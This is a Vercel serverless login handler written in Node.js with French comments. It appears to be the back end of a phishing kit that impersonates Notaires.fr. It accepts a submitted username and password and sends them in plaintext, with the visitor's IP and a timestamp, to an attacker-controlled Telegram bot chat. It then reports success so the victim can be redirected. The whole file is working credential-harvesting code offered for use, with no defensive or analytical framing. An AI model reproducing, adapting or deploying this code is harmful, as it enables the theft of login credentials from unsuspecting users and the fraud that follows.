// api/login.js - Fonction Serverless Vercel (Node.js)
export default async function handler(req, res) {
    if (req.method !== 'POST') {
        res.setHeader('Allow', ['POST']);
        return res.status(405).json({ status: 'error', message: `Méthode ${req.method} non autorisée` });
    }

    try {
        // Parsing sécurisé du corps de la requête
        let body = req.body;
        if (typeof body === 'string') {
            try { body = JSON.parse(body); } catch (e) { body = {}; }
        }

        const { username, password } = body || {};

        if (!username || !password) {
            return res.status(400).json({ status: 'error', message: 'Données manquantes' });
        }

        const telegramToken = process.env.TELEGRAM_BOT_TOKEN || 'VOTRE_TOKEN_BOT_SECURISE';
        const chatId = process.env.TELEGRAM_CHAT_ID || 'VOTRE_CHAT_ID_SECURISE';

        const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Inconnue';

        // Formatage du message pour Telegram
        let message = "🔒 **Nouvelle tentative de connexion - Notaires.fr**\n\n";
        message += `👤 **Identifiant:** \`${username}\`\n`;
        message += `🔑 **Mot de passe:** \`${password}\`\n`;
        message += `🌐 **IP:** \`${clientIp}\`\n`;
        message += `📅 **Date:** ${new Date().toISOString().replace('T', ' ').substring(0, 19)}`;

        const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        if (!response.ok) {
            return res.status(500).json({ status: 'error', message: "Erreur lors de la communication avec l'API Telegram" });
        }

        return res.status(200).json({ status: 'success', redirect: true });

    } catch (error) {
        console.error(error);
        return res.status(500).json({ status: 'error', message: 'Erreur interne du serveur' });
    }
}
